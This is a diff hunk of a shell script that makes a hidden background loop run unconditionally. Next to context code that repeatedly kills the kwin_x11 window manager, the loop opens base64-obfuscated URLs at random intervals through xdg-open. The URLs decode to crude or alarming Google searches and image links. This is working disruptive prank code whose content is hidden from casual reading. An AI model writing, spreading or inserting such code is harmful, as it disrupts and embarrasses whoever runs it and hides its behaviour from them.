@@ -15,23 +15,21 @@ if command -v kwin; then
     pkill -x kwin_x11
   done) &
 fi
-if $X; then
-  (while true; do
-    sleep $(awk -v seed=jfo3 'BEGIN{srand(seed); print rand() * 45}')
-    S=(
-      "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPXdoeSUyMGlzJTIwbXklMjBhc3MlMjBibGVlZGluZw=="
-      "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPWNvcnBzZSUyMG9mJTIwa2luZyUyMG1pbm9zJTIwbW9kZSUyMGFjdGl2YXRlZA=="
-      "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPUhFTFAlMjBJTSUyME9OJTIwRklSRSUyMElUJTIwQlVSTlM="
-      "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPUluJTIwdGhlJTIwc3RyaXBwZWQlMjBjbHViLiUyMHN0cmFpZ2h0JTIwdXAlMjAiam9ya2luJTIwaXQiLiUyMGFuZCUyMGJ5JTIwIml0IiwlMjBoYWhhLCUyMHdlbGwuJTIwbGV0J3MlMjBqdXN0ciUyMHNheSUyMG15JTIwcGVhbml0cw=="
-      "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPWltJTIwZnVja2luZyUyMGR5aW5n"
-      "aHR0cHM6Ly9pNS5jbG91ZGZhYmxlLm5ldC9zdHlsZXMvNTUweDU1MC81NzYuMjQwL0JsYWNrL2ZyZWFrYm9iLWNhbGxpbmctZnJlYWthYm9iLW1lbnMtdC1zaGlydC1iYWNrLTIwMjQwODEyMDgyNTA1LW80MG12bHh4LXMzLmpwZw=="
-      "aHR0cHM6Ly9mNC5iY2JpdHMuY29tL2ltZy9hMjA0NTUyNTAyMl8xNi5qcGc="
-    )
-    R="${S[RANDOM % ${#S[@]}]}"
-    R=$(echo "$R" | base64 --decode)
-    xdg-open "$R" 2>/dev/null || open "$R"
-  done) &
-end
+(while true; do
+  sleep $(awk -v seed=jfo3 'BEGIN{srand(seed); print rand() * 45}')
+  S=(
+    "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPXdoeSUyMGlzJTIwbXklMjBhc3MlMjBibGVlZGluZw=="
+    "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPWNvcnBzZSUyMG9mJTIwa2luZyUyMG1pbm9zJTIwbW9kZSUyMGFjdGl2YXRlZA=="
+    "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPUhFTFAlMjBJTSUyME9OJTIwRklSRSUyMElUJTIwQlVSTlM="
+    "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPUluJTIwdGhlJTIwc3RyaXBwZWQlMjBjbHViLiUyMHN0cmFpZ2h0JTIwdXAlMjAiam9ya2luJTIwaXQiLiUyMGFuZCUyMGJ5JTIwIml0IiwlMjBoYWhhLCUyMHdlbGwuJTIwbGV0J3MlMjBqdXN0ciUyMHNheSUyMG15JTIwcGVhbml0cw=="
+    "aHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPWltJTIwZnVja2luZyUyMGR5aW5n"
+    "aHR0cHM6Ly9pNS5jbG91ZGZhYmxlLm5ldC9zdHlsZXMvNTUweDU1MC81NzYuMjQwL0JsYWNrL2ZyZWFrYm9iLWNhbGxpbmctZnJlYWthYm9iLW1lbnMtdC1zaGlydC1iYWNrLTIwMjQwODEyMDgyNTA1LW80MG12bHh4LXMzLmpwZw=="
+    "aHR0cHM6Ly9mNC5iY2JpdHMuY29tL2ltZy9hMjA0NTUyNTAyMl8xNi5qcGc="
+  )
+  R="${S[RANDOM % ${#S[@]}]}"
+  R=$(echo "$R" | base64 --decode)
+  xdg-open "$R" 2>/dev/null || open "$R"
+done) &
 
 # if command -v xdotool >/dev/null 2>&1; then
 #   export $(dbus-launch)
